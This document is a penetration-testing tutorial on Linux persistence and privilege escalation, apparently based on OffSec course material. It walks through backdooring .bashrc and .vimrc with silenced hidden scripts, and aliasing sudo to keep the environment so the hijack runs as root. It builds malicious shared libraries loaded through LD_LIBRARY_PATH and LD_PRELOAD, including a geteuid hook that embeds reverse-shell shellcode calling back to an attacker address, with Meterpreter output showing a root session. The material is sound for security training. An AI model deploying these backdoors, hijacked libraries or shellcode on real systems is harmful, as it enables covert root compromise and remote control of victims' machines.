
Linux (or a Unix variant) is widely regarded as having the majority share of the world’s servers and cloud environments, supercomputers, and IoT devices. Unix variants are also ubiquitous as a mobile operating system due to the Android operating system. Because of this, it’s helpful for penetration testers to have an extensive knowledge of Linux and how its unique functionality can benefit them during a security assessment.

# User Configuration Files

In Linux systems, applications frequently store user-specific configuration files and subdirectories within a user’s home directory.

These configuration files control how applications behave for a specific user and are typically only writable by the user themselves or root. If we compromise a system under a given user, we can modify those files and change how applications behave for them.

Two common examples of dotfiles are `.bash_profile` and `.bashrc`.

`.bash_profile` is executed when logging in to the system initially.

`.bashrc` is executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.

`.bashrc` example:
```bash
offsec@linuxvictim:~$ echo "touch /tmp/bashtest.txt" >> ~/.bashrc
offsec@linuxvictim:~$ ls -al /tmp/bashtest.txt
ls: cannot access '/tmp/bashtest.txt': No such file or directory
offsec@linuxvictim:~$ /bin/bash
offsec@linuxvictim:~$ ls -al /tmp/bashtest.txt
-rw-rw-r-- 1 offsec offsec 0 Aug 26 15:19 /tmp/bashtest.txt
offsec@linuxvictim:~$ exit
offsec@linuxvictim:~$
```

# VIM Config Simple Backdoor

On many Linux systems, user-specific VIM configuration settings are located in a user’s home directory in the `.vimrc` file. This file takes VIM-specific scripting commands and configures the VIM environment when a user starts the application.

These commands can also be run from within the editor by typing a colon (:) character followed by the desired command. For example, if we want to print a message to the user, we can use the following command in the `.vimrc` file or within the editor. 
```bash
:echo "this is a test"
```

The commands specified in the `.vimrc` file are executed when VIM is launched.

Putting our commands directly into the user’s `.vimrc` file isn’t particularly stealthy, as a user modifying their own settings may accidentally discover the changes we’ve made. There is, however, another option.

We can “source” a shell script using the bash source command. This loads a specified shell script and runs it for us during the normal configuration process.

We can also “import” other VIM configuration files into the user’s current config with the `:source` command.

We can modify the user’s `.vimrc` file in their home directory (or create one if they don’t have it) and add the following line.
```bash
!source ~/.vimrunscript
```

Next, we can create the shell script file at /home/offsec/.vimrunscript with the following contents:
```bash
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```

If we run vim as the user:
```bash
offsec@linuxvictim:~$ vi /tmp/test.txt
:!source /home/offsec/.vimrunscript
Press ENTER or type command to continue
```

This is obviously undesirable as it would tip off the user. Luckily, VIM has a built-in command for this, the `:silent` command mutes any debug output:
```bash
:silent !source ~/.vimrunscript
```

If the user has sudo access, we may be able to do more.

We can weaponize this VIM vector to gain root privileges if the user runs VIM as root or uses the visudo command.

In some systems such as Ubuntu and Red Hat, VIM will use the current user’s .vimrc configuration file even in a sudo context. In other distributions, such as Debian, in a sudo context, VIM will use the root user’s VIM configuration.

In an assessment on an Ubuntu, Red Hat, or similar system, if the user runs VIM via sudo, our script being sourced will also run as root. Because of this, we will achieve root access without any extra effort. On a Debian or similar system that does not persist the user’s shell environment information when moving to a sudo context, we can add an `alias` to the user’s `.bashrc` file.
```bash
alias sudo="sudo -E"
```

This will substitute the standard sudo command with one that has the `-E` flag to force sudo to persist the user's VIM settings. Now we just run `source` to apply the changes:
```bash
offsec@linuxvictim:~$ source ~/.bashrc
```

In some cases, users are given limited sudo rights to run only specific programs. We can check this from a shell using the following command (we’re using the linuxvictim user here).
```bash
linuxvictim@linuxvictim:~$ sudo -l
Matching Defaults entries for linuxvictim on linuxvictim:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/b
in
User linuxvictim may run the following commands on linuxvictim:
(root) NOPASSWD: /usr/bin/vim /opt/important.conf
```

In this case, a password is not required for sudo access. Because of this, we can run VIM and then enter `:shell` to gain a root shell automatically.

# Shared Libraries

When an application runs on Linux, it checks for its required libraries in a number of locations in a specific order. When it finds a copy of the library it needs, it stops searching and loads the module it finds. The application searches for libraries in these locations, following this ordering.
1. Directories listed in the application’s `RPATH` value.
2. Directories specified in the `LD_LIBRARY_PATH` environment variable.
3. Directories listed in the application’s `RUNPATH` value.
4. Directories specified in `/etc/ld.so.conf`.
5. System library directories: `/lib`, `/lib64`, `/usr/lib`, `/usr/lib64`,` /usr/local/lib`, `/usr/local/lib64`, and potentially others.

# Shared Library Hijacking via LD_LIBRARY_PATH

When an application runs, it checks for its libraries in an ordered set of locations. After checking its internal RPATH values for hard coded paths, it then checks for an environment variable called `LD_LIBRARY_PATH`.

We are explicitly setting the environment variable before each call. However, as an attacker, we would want to insert a line in the user’s `.bashrc` or `.bash_profile` to define the `LD_LIBRARY_PATH` variable so it is set automatically when the user logs in.

One difficulty with using `LD_LIBRARY_PATH` for exploitation is that on most modern systems, user environment variables are not passed on when using sudo. This setting is configured in the `/etc/sudoers` file by using the `env_reset` keyword as a default.

We can bypass this setting by configuring again the alias for sudo with `sudo -E` in `.bashrc`:
```bash
alias sudo="sudo -E"
```

Example, save the following as hax.c:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

void runmahpayload() {
	setuid(0);
	setgid(0);
	printf("DLL HIJACKING IN PROGRESS \n");
	system("touch /tmp/haxso.txt");
}
```

The fourth line provides a function declaration for a constructor function called `runmahpayload`. Constructor, functions are run when the library is first initialized in order to set up code for the library to use.

We are creating a constructor function so that our malicious code will run when our library is loaded, regardless of what the original program is trying to do with it. In other words, the original program will try to load the library, which will then run our constructor function, triggering our malicious payload.

Compile with `gcc`:
```bash
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o hax.o hax.c
```

In the first command, we use the `-Wall` parameter, which gives more verbose warnings when compiling. The `-fPIC` option tells the compiler to use position independent code, which is suitable for shared libraries since they are loaded in unpredictable memory locations. The `-c` flag tells `gcc` to compile but not link the code and `-o` tells the compiler to produce an output file with the name immediately following the parameter.

In the second command, we’re again using `gcc` to compile. However, this time we use the `-shared` parameter to tell `gcc` we’re creating a shared library from our object file. We then specify an output file again, this time with the name libhax.so, and then we specify our input object file.
```bash
offsec@linuxvictim:~/ldlib$ gcc -shared -o libhax.so hax.o
```

Libraries follow the `soname` naming convention which is indicated by the `.so` extension followed by a number indicating a version, like `lib.so.1`.

We want to find something that won’t break the system if all programs are prevented from using it.

We can get a list of libraries binaries load when executing using `ldd`:
```bash
offsec@linuxvictim:~$ ldd /usr/bin/top
linux-vdso.so.1 (0x00007ffd135c5000)
libprocps.so.6 => /lib/x86_64-linux-gnu/libprocps.so.6 (0x00007ff5ab935000)
libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007ff5ab70b000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ff5ab507000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5ab116000)
libsystemd.so.0 => /lib/x86_64-linux-gnu/libsystemd.so.0 (0x00007ff5aae92000)
/lib64/ld-linux-x86-64.so.2 (0x00007ff5abd9b000)
librt.so.1 => /lib/x86_64-linux-gnu/librt.so.1 (0x00007ff5aac8a000)
liblzma.so.5 => /lib/x86_64-linux-gnu/liblzma.so.5 (0x00007ff5aaa64000)
liblz4.so.1 => /usr/lib/x86_64-linux-gnu/liblz4.so.1 (0x00007ff5aa848000)
libgcrypt.so.20 => /lib/x86_64-linux-gnu/libgcrypt.so.20 (0x00007ff5aa52c000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007ff5aa30d000)
libgpg-error.so.0 => /lib/x86_64-linux-gnu/libgpg-error.so.0 (0x00007ff5aa0f8000)
```

The last library seems to be for handling GPG errors, we can use it as it is not a core library and will not disrupt system operations.

We will no setup the environment variable and rename our malicious library:
```bash
offsec@linuxvictim:~/ldlib$ export LD_LIBRARY_PATH=/home/offsec/ldlib/

offsec@linuxvictim:~/ldlib$ cp libhax.so libgpg-error.so.0
```

If we run `top`, we now see the following:
```bash
offsec@linuxvictim:~/ldlib$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required by /lib/x86_64-linux-gnu/libgcrypt.so.20)
top: relocation error: /lib/x86_64-linux gnu/libgcrypt.so.20: symbol gpgrt_lock_lock version GPG_ERROR_1.0 not defined in file libgpg-error.so.0 with link time reference
```

This means that certain variables or functions that the program expects to find when loading the original library have not been defined in our malicious library. As a result, the program won’t even attempt to run our library’s constructor.

We can simply define some variables with the same names that it expects and top should run.

Let’s examine it and determine what symbols it contains using the readelf utility. The `-s` parameter will give a list of available symbols in the library:
```bash
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
...
int gpgrt_fflush;
int gpgrt_poll;
```

We’ll pipe that output to grep and search for lines containing “FUNC” representing symbols we need to capture.

We’ll then pipe this to grep again and filter out only the results that also contain “GPG_ERROR”, indicating they are stored in our library and not in an unrelated dependency.

We'll use `awk` to prepend "int" to the result, and `sed` to replace the version that will appear, with a `;` semicolon

If we edit our malicious code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid
static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;

void runmahpayload() {
	setuid(0);
	setgid(0);
	printf("DLL HIJACKING IN PROGRESS \n");
	system("touch /tmp/haxso.txt");
}
```

With the added symbols, we can compile it again:
```bash
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o hax.o hax.c

offsec@linuxvictim:~/ldlib$ gcc -shared -o libhax.so hax.o
```

We can now run `top` without it crashing:
```bash
offsec@linuxvictim:~/ldlib$ top
top: /home/offsec/ldlib/libgpg-error.so.0: no version information available (required
by /lib/x86_64-linux-gnu/libgcrypt.so.20)
DLL HIJACKING IN PROGRESS
...
```

But we still see an error which is due to the fact that `libgcrypt` requires a version from associated libraries.

We can fix this with the help of a map file that identifies particular symbols as being associated with a given version of the library. We run the `readelf` command but now omitting the "int"
```bash
offsec@linuxvictim:~/ldlib$ readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
...
```

We save the result into a file `gpg.map`:
```bash
GPG_ERROR_1.0 {
gpgrt_onclose;
_gpgrt_putc_overflow;
gpgrt_feof_unlocked;
gpgrt_vbsprintf;
}
```

We can now recompile it, this time adding `--verions-script` to include the `gpg.map` file for the library:
```bash
offsec@linuxvictim:~/ldlib$ gcc -Wall -fPIC -c -o hax.o hax.c
offsec@linuxvictim:~/ldlib$ gcc -shared -Wl,--version-script gpg.map -o libgpgerror.so.0 hax.o
```

Now, we can run the `top` command without any issues:
```bash
offsec@linuxvictim:~/ldlib$ top
DLL HIJACKING IN PROGRESS
top - 14:55:15 up 9 days, 4:35, 2 users, load average: 0.01, 0.01, 0.00
Tasks: 164 total, 1 running, 92 sleeping, 0 stopped, 0 zombie
...
```

We verify it worked by going to the `/tmp` directory:
```bash
offsec@linuxvictim:~/ldlib$ ls -al /tmp/haxso.txt
-rw-rw-r-- 1 offsec offsec 0 Jul 10 17:12 /tmp/haxso.txt
```

Since sudo would still not pass `LD_LIBARY_PATH`, we have to modify that sudo alias in`.bashrc` again to get around it:
```bash
alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"
```

We can now run `top` with or without sudo to include our malicious library:
```bash
offsec@linuxvictim:~/ldlib$ source ~/.bashrc
offsec@linuxvictim:~/ldlib$ sudo top
DLL HIJACKING IN PROGRESS
top - 14:51:20 up 6 days, 6:03, 5 users, load average: 0.00, 0.00, 0.00
...
offsec@linuxvictim:~/ldlib$ ls -al /tmp/haxso.txt
-rw-r--r-- 1 root root 0 Aug 11 14:51 /tmp/haxso.txt
```

# Exploitation via LD_PRELOAD

`LD_PRELOAD` is an environment variable which, when defined on the system, forces the dynamic linking loader to preload a particular shared library before any others. As a result, functions that are defined in this library are used before any with the same method signature that are defined in other libraries.

It also faces the same constraint of not being passed to sudo unless the user’s real UID is the same as their effective

LD_PRELOAD will override methods loaded later on. Overriding methods in this way is a technique known as function hooking.

We can run `ltrace` on a command a user is likely to use more frequently, like the `cp` command to get a list of library function calls it uses during normal operation.
```bash
offsec@linuxvictim:~$ ltrace cp
strrchr("cp", '/') = nil
...
geteuid() = 1000
getenv("POSIXLY_CORRECT") = nil
...
fflush(0x7f717f0c0680) = 0
fclose(0x7f717f0c0680) = 0
+++ exited (status 1) +++
```

We can see that `geteuid` is called once when running the program and thus will not create redundant shells

It takes no parameters and returns the user's UID

We can hook the function as a form of patch to retain original behaviour

We'll use `dlfcn.h`  as it defines functions for interacting with the dynamic linking loader:
```c
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] =
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

uid_t geteuid(void)
{
	typeof(geteuid) *old_geteuid;
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if (fork() == 0)
	{
		intptr_t pagesize = sysconf(_SC_PAGESIZE);
		if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
				perror("mprotect");
				return -1;
		}
		int (*ret)() = (int(*)())buf;
		ret();
	}
	else
	{
		printf("HACK: returning from function...\n");
		return (*old_geteuid)();
	}
	printf("HACK: Returning from main...\n");
	return -2;
}
```

We compile `evileuid.c` with gcc:
```bash
offsec@linuxvictim:~$ gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c

offsec@linuxvictim:~$ gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl
```

Now we test it:
```bash
offsec@linuxvictim:~$ cp /etc/passwd /tmp/testpasswd

offsec@linuxvictim:~$ export LD_PRELOAD=/home/offsec/evil_geteuid.so

offsec@linuxvictim:~$ cp /etc/passwd /tmp/testpasswd
HACK: returning from function...
```

And we return to our meterpreter session:
```bash
msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.119.120:1337
[*] Sending stage (3012516 bytes) to 192.168.120.46
[*] Meterpreter session 8 opened (192.168.119.120:1337 -> 192.168.120.46:58114) at 2020-07-28 16:58:40 -0400
meterpreter > getuid
Server username: no-user @ linuxvictim (uid=1000, gid=1000, euid=1000, egid=1000)
```


Before continuing, we’ll unset LD_PRELOAD which could have adverse effects on other system actions we’ll perform.
```bash
offsec@linuxvictim:~$ unset LD_PRELOAD
```

For escalation, we can use the previous approach of setting an alias for the sudo command in `.bashrc`:
```bash
alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"
```

After loading it:
```bash
offsec@linuxvictim:~$ sudo cp /etc/passwd /tmp/testpasswd
HACK: returning from function...
``` 

We can go back to our meterpreter session with root privileges:
```bash
msf5 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.119.120:1337
[*] Sending stage (3012516 bytes) to 192.168.120.46
[*] Meterpreter session 9 opened (192.168.119.120:1337 -> 192.168.120.46:39464) at 2020-07-29 11:16:07 -0400
meterpreter > getuid
Server username: no-user @ linuxvictim (uid=0, gid=0, euid=0, egid=0)
```

